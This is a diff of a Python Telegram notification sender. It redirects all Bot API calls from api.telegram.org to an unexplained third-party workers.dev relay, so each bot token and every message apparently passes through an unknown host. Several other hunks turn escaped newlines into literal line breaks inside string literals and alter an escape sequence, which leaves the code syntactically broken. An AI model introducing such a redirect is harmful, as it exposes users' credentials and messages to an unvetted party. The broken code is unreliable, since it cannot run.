@@ -49,7 +49,7 @@ class TelegramSender:
         推送消息到 Telegram 机器人
 
         Telegram Bot API 格式：
-        POST https://api.telegram.org/bot<token>/sendMessage
+        POST https://telegram-relay.sadinbdjjjd.workers.dev/bot<token>/sendMessage
         {
             "chat_id": "xxx",
             "text": "消息内容",
@@ -79,7 +79,7 @@ class TelegramSender:
 
         try:
             # Telegram API 端点
-            api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            api_url = f"https://telegram-relay.sadinbdjjjd.workers.dev/bot{bot_token}/sendMessage"
 
             # Telegram 消息最大长度 4096 字符
             max_length = 4096
@@ -180,7 +180,8 @@ class TelegramSender:
     @staticmethod
     def _should_fallback_to_plain_text(error_desc: str = "", response_text: str = "") -> bool:
         """Detect Telegram Markdown parsing failures that should retry as plain text."""
-        haystack = f"{error_desc}\n{response_text}".lower()
+        haystack = f"{error_desc}
+{response_text}".lower()
         markers = (
             "can't parse entities",
             "can't parse entity",
@@ -243,7 +244,9 @@ class TelegramSender:
     ) -> bool:
         """分段发送长 Telegram 消息"""
         # 按段落分割
-        sections = content.split("\n---\n")
+        sections = content.split("
+---
+")
 
         current_chunk = []
         current_length = 0
@@ -251,12 +254,16 @@ class TelegramSender:
         chunk_index = 1
 
         for section in sections:
-            section_length = len(section) + 5  # +5 for "\n---\n"
+            section_length = len(section) + 5  # +5 for "
+---
+"
 
             if current_length + section_length > max_length:
                 # 发送当前块
                 if current_chunk:
-                    chunk_content = "\n---\n".join(current_chunk)
+                    chunk_content = "
+---
+".join(current_chunk)
                     logger.info(f"发送 Telegram 消息块 {chunk_index}...")
                     if not self._send_telegram_message(api_url, chat_id, chunk_content, message_thread_id, timeout_seconds=timeout_seconds):
                         all_success = False
@@ -271,7 +278,9 @@ class TelegramSender:
 
         # 发送最后一块
         if current_chunk:
-            chunk_content = "\n---\n".join(current_chunk)
+            chunk_content = "
+---
+".join(current_chunk)
             logger.info(f"发送 Telegram 消息块 {chunk_index}...")
             if not self._send_telegram_message(api_url, chat_id, chunk_content, message_thread_id, timeout_seconds=timeout_seconds):
                 all_success = False
@@ -285,7 +294,7 @@ class TelegramSender:
         bot_token = self._telegram_config['bot_token']
         chat_id = self._telegram_config['chat_id']
         message_thread_id = self._telegram_config.get('message_thread_id')
-        api_url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
+        api_url = f"https://telegram-relay.sadinbdjjjd.workers.dev/bot{bot_token}/sendPhoto"
         try:
             data = {"chat_id": chat_id}
             if message_thread_id:
@@ -330,7 +339,7 @@ class TelegramSender:
 
         # Step 2: escape remaining special chars
         for char in ['[', ']', '(', ')']:
-            result = result.replace(char, f'\\{char}')
+            result = result.replace(char, f'\{char}')
 
         # Step 3: restore links
         for i, link in enumerate(_links):
